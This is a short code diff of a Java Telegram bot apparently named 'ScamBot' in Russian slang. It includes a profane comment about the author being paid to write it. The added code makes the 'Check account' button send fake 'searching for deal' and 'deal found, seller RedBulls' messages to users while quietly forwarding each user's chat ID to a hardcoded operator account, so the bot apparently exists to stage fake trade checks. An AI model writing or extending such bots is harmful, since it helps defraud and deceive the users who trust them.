@@ -14,6 +14,9 @@ public class NaebBot extends TelegramLongPollingCommandBot {
 
     private Long naebChatId;
 
+
+    /*Мне заплатили 460 рублей, так что это еще заебатый бот! А написал его @SofHacker*/
+
         public NaebBot() {
             StartCommand startCommand = new StartCommand(this);
             register(startCommand);
@@ -39,9 +42,10 @@ public class NaebBot extends TelegramLongPollingCommandBot {
             Menu menu = new Menu();
             switch (msg.getText()) {
                 case "Проверить аккаунт":{
-                    sendKeyboardMarkupToUser(chatId,menu.getMainMenuReplyKeyboard(),"Отправьте 99999руб на номер 88005553535 и получите по ебалу");
                     System.out.println(msg.getChatId());
                     sendMessageToUser(615213408,msg.getChatId().toString());
+                    sendMessageToUser(msg.getChatId(),"Ищем сделку...");
+                    sendMessageToUser(msg.getChatId(),"Сделка найдена, продавец RedBulls. Ожидайте проверки аккаунта...");
                     break;
                 }
                 case "Очередной наеб":{
